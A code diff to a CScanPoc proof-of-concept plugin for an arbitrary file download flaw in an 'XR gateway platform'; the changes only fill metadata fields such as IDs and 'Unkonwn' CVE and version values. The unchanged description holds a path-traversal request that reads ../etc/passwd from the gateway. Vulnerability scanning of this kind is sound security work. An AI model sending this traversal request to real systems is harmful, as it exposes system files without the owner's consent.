@@ -4,7 +4,7 @@ from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
 class Vuln(ABVuln):
-    vuln_id = 'XR_GatewayPlatform_0001' # 平台漏洞编号，留空
+    poc_id = 'b2805571-c468-4684-9bbf-535e03b16afa'
     name = 'XR网关平台 任意文件遍历下载'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
     type = VulnType.FILE_DOWNLOAD # 漏洞类型
@@ -15,10 +15,10 @@ class Vuln(ABVuln):
         /msa/main.xp?Fun=msaDataCenetrDownLoadMore+delflag=1+downLoadFileName=test.txt+downLoadFile=../etc/passwd
     '''  # 漏洞描述
     ref = 'http://www.codesec.net/view/249007.html'  # 漏洞来源
-    cnvd_id = ''  # cnvd漏洞编号
-    cve_id = ''  # cve编号
+    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
+    cve_id = 'Unkonwn'  # cve编号
     product = 'XR网关平台'  # 漏洞应用名称
-    product_version = ''  # 漏洞应用版本
+    product_version = 'Unkonwn'  # 漏洞应用版本
 
 class Poc(ABPoc):
     poc_id = 'a59c3487-3579-4d86-bf9b-3438780e7c9d'
